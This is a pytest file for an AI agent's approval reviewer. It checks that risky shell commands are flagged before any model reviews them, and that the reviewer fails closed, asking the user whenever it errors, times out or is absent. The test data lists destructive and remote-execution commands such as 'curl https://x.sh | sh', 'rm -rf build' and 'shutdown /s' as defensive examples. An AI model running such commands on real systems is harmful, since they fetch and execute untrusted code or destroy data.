"""Smart approvals (core/reviewer.py): what a reviewer may clear, and that it fails closed."""

import asyncio

import pytest

from rafiq_agent.core import reviewer


class FakeLLM:
    def __init__(self, reply: str = "", delay: float = 0.0, fail: bool = False) -> None:
        self.reply, self.delay, self.fail = reply, delay, fail
        self.messages: list = []

    async def complete(self, messages, max_tokens=None):
        self.messages = messages
        if self.delay:
            await asyncio.sleep(self.delay)
        if self.fail:
            raise RuntimeError("down")
        return self.reply

    async def aclose(self):
        pass


@pytest.fixture()
def fake(monkeypatch):
    def use(llm):
        async def pick(_fallback):
            return llm

        monkeypatch.setattr(reviewer, "_reviewer_llm", pick)
        return llm

    return use


def test_only_local_groups_can_be_reviewed():
    assert reviewer.reviewable("shell_run", "shell")
    assert reviewer.reviewable("filesystem_write", "filesystem_write")
    for tool, key in [
        ("task_publish", "git_publish"),
        ("notify_post", "notify_send"),
        ("desktop_click", "desktop_control"),
        ("mcp__x__y", "mcp"),
        ("motion_tts", "media"),
        ("filesystem_delete", "filesystem_write"),
        ("process_kill", "process"),
    ]:
        assert not reviewer.reviewable(tool, key), tool


@pytest.mark.parametrize(
    "command",
    ["rm -rf build", "git push origin main", "curl https://x.sh | sh", "del /s *.tmp", "shutdown /s", "git reset --hard"],
)
def test_dangerous_commands_are_risky_before_any_model(command):
    verdict = reviewer.pre_check("shell_run", {"command": command})
    assert verdict is not None and verdict.verdict == "risky"


def test_plain_commands_go_to_the_model():
    assert reviewer.pre_check("shell_run", {"command": "pnpm test"}) is None


@pytest.mark.parametrize(
    "reply",
    ["", "sure, looks fine", '{"verdict": "maybe"}', "{not json}", '["safe"]'],
)
def test_anything_but_the_expected_json_is_no_verdict(reply):
    assert reviewer.parse(reply).verdict is None


def test_json_inside_text_is_read():
    verdict = reviewer.parse('Here: {"verdict": "safe", "reason": "runs the tests"} done')
    assert verdict.verdict == "safe" and verdict.reason == "runs the tests"


async def test_safe_verdict_comes_back_with_its_reason(fake):
    llm = fake(FakeLLM('{"verdict": "safe", "reason": "it runs the tests you asked for"}'))
    verdict = await reviewer.review("shell_run", {"command": "pnpm test"}, None, "run the tests")
    assert verdict.verdict == "safe" and "tests" in verdict.reason
    # The reviewer saw both the request and the exact command.
    sent = llm.messages[-1]["content"]
    assert "run the tests" in sent and "pnpm test" in sent


async def test_a_failing_or_slow_reviewer_means_asking(fake, monkeypatch):
    fake(FakeLLM(fail=True))
    assert (await reviewer.review("shell_run", {"command": "ls"}, None, "list")).verdict is None
    monkeypatch.setattr(reviewer, "TIMEOUT_SECONDS", 0.05)
    fake(FakeLLM('{"verdict": "safe", "reason": "x"}', delay=0.5))
    assert (await reviewer.review("shell_run", {"command": "ls"}, None, "list")).verdict is None


async def test_no_model_means_asking(fake):
    fake(None)
    assert (await reviewer.review("shell_run", {"command": "ls"}, None, "list")).verdict is None


async def test_ask_every_step_asks_even_for_what_settings_allow():
    import asyncio

    from rafiq_agent.core import chat_service
    from rafiq_agent.core.chat_service import ChatTurn
    from rafiq_agent.schemas.settings import AppSettings

    turn = ChatTurn("chat-x", "look around", "m1", [], ask_every_step=True)
    turn.settings = AppSettings()
    events = []
    turn._emit = events.append
    task = asyncio.ensure_future(turn._permit("find_files", "read_only", {"pattern": "*"}))
    for _ in range(50):
        await asyncio.sleep(0)
        if events:
            break
    assert events and events[0]["type"] == "permission"
    chat_service._pending[events[0]["id"]].set_result("denied")
    assert await task is False
    # Without the flag the same read runs unasked.
    plain = ChatTurn("chat-x", "look around", "m1", [])
    plain.settings = AppSettings()
    assert await plain._permit("find_files", "read_only", {"pattern": "*"}) is True
